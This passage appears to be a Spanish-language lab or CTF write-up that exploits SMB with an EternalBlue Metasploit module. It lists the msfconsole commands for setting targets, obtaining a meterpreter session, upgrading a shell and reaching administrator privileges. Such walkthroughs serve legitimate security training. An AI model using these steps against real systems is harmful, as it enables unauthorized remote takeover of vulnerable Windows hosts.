Explotamos SMB Link to heading

Por tanto utilizaremos metasploit para buscar algún modulo de eternalblue

Hacemos un

msfconsole
search eternal

y nos aparecen las siguientes opciones, usaremos la opción 2 ![[Pasted image 20251104121151.png]]

use 2
show options

En las opciones debemos poner el RHOSTS y LPORT ![[Pasted image 20251104121257.png]]

Y luego le damos a run y conseguimos una session de meterpreter ![[Pasted image 20251104121632.png]]

Tratamos la consola Link to heading

Usamos los siguientes comandos

background
search shell_to_meterpreter
use 0

![[Pasted image 20251104121917.png]]

Usamos la session 1 y le damos a run

set SESSION 1
run

Utilizamos sessions -l para ver las sessiones y utilizamos session -i 2 para escogerla ![[Pasted image 20251104122609.png]]

Usamos una shell y vemos que tenemos priv de admin ![[Pasted image 20251104122633.png]]
